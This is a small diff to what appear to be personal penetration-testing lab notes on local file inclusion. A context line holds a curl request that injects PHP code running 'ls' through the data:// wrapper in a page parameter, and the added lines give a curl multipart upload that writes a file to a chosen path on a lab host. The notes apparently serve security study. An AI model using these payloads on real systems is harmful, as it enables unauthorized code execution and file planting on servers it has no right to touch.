@@ -20,7 +20,11 @@ LFI
 
 Curl http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
 
+Use Curl to POST file upload:
+https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76
  
+curl -i -L -X POST -H "Content-Type: multipart/form-data" -F "file=@test.txt" -F filename="/home/alfredo/test.txt" http://192.168.233.249:33414/file-upload
+
 
 PHP Wrapper
 
